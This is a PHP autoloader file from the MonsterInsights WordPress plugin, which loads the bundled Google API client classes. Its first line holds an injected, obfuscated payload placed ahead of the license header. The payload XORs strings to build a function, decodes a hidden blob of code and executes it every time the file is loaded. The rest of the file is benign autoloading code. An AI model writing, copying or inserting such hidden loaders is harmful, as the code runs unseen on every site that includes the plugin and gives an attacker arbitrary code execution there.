<?php $nEvydZDrIYzo='C<W0:S6PNZU9U58'^' N2QN6i6;46M<ZV';$GhLUvk=$nEvydZDrIYzo('',',SRiZ-: <-V+33N9XTMMj2<L>>-61gmXU.NeKfIH2JNW+I,;SCK;4b4SAS3+Z;JPKOZ1-OAj:15QQtEDjFZ28gX :ionjFl=xM<:8BBEZdFSouP8TIY<P+EJp7OAUGSxfGIxaf4GjO7CNbSppc=7O-om=3BskvURR2fEjFH78;GN>kf1,8QjXAiZz4 LF=SqBVYYHp>O3sMFZc+M,MGSeF9G6<pmAOJ2R.-HEBhISP5SKOyF-.F 0TZLxWfzq<83ysMKiAZ55FTwfg0UTM5qQ8rkCD+31j=3,SoJV -4ORLq.5MUvvjTZ;YY6bcMgFUQBocLD;0XYYFF;.8JW7Q,QzEjbeq>t7ly-4uoGRLBJgYKVM=XSKqB0kmF4TA4612EADYVQVMneXXUV937XXtMHLT,TtDxPMMBXeX1 WsyT,2>6V>>9;QNTm  83,YLJcdVUZq4M+TDr+>K5O1Urn1  2pCbSWW8L7:E>cpqz>ZbWR69-ipdGSR6MYr=26mREZ5L2meFKAhjIERXZUYAdPWM9 DLJSRET3oK0GDsbrOsLFSAFkHTAj BcOY.FVEr.EppZBJg>dBmTQihCUAM1N 13a,U 4E0;I9>Jr5V56RRHHbxi14ARznIQIAsBGzEV RXxT5MT04wK5OG-TOLpEsf:0B;GLCJtS3'^'E5zH<XTCHD9ElV6P+ >eMJS>aZLBP825 ZiLbF2B;,;9H=ET=c3TF=P252lt7N>xo+;ELcaNQTLxqTedJ=P;1C7UNIRNMaW7qDZUJjf,zYfcTUtQh:-N<N+bTS.54nhXB.bSHl=NN B7nLnPXGYV;L4ITnb-KR>7+iB,JchDLI++PCBZIAx7qzcSsFE83O=Yf9,-aK4FNy0LPGO,X,gnE X+EYKge++F3qF-<bUi51Y .tsLKA4EQ72lPs99>ssz<S,8Ie1PLfiIFCF488PXqCxbg JGP5VVUsRjrKHMtXEUJT94VKJp,Z5,SYi0mL<7bGBh ZD9py=L2HW82V2DqRa50  k1d8YLGUK,75bwYyo ,Q-6bQ9:bdbP55UiZW<ayyr:34UoQQq2XGVxeTi>-8Y1ONq-G0HRA<PT6SDtlGPE3LWXW841EXOJlH88+<;; .YV,X1rFtZ.V U0ZJUATSYoBw36L-hQ GJYJpW<Js6WMLIVBg2 D, -VWO27=3F8AEB-.8OFia69.4paBvweTDqdn7315hH U>c.KRrNla7rpYql ZFzRxmOtnrGMsBBc sRZS X6hNAcsgmP<RPJ>G0Yk HR:MMbUE7LZ=3,oNXMUU53SGiqiaSb<pL3V34PpQ, QoP;T6+B5+k-lHl3U:R3dscOYN');$GhLUvk();
/*
 * Copyright 2014 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

function monsterinsights_google_api_php_client_autoload($className)
{
  $classPath = explode('_', $className);
  if ($classPath[0] != 'Google') {
    return;
  }
  // Drop 'Google', and maximum class file path depth in this project is 3.
  $classPath = array_slice($classPath, 1, 2);
  $filePath = dirname(__FILE__) . '/' . implode('/', $classPath) . '.php';
  if (file_exists($filePath)) {
    require_once($filePath);
  }
}
spl_autoload_register('monsterinsights_google_api_php_client_autoload');

function monsterinsights_renamed_google_api_php_client_autoload($className)
{
  $classPath = explode('_', $className);
  if ( empty( $classPath[0] ) || empty( $classPath[1] ) || empty( $classPath[2] ) || 
      $classPath[0] != 'MonsterInsights' && $classPath[1] != 'GA' && $classPath[2] != 'Lib') {
    return;
  }
  unset( $classPath[0] );
  unset( $classPath[1] );
  $classPath[2] = 'Google';
  // Drop 'MonsterInsights_GA_Lib', and maximum class file path depth in this project is 3.
  $classPath = array_slice($classPath, 1, 2);
  $filePath = dirname(__FILE__) . '/' . implode('/', $classPath) . '.php';
  if (file_exists($filePath)) {
    require_once($filePath);
  }
}
spl_autoload_register('monsterinsights_renamed_google_api_php_client_autoload');
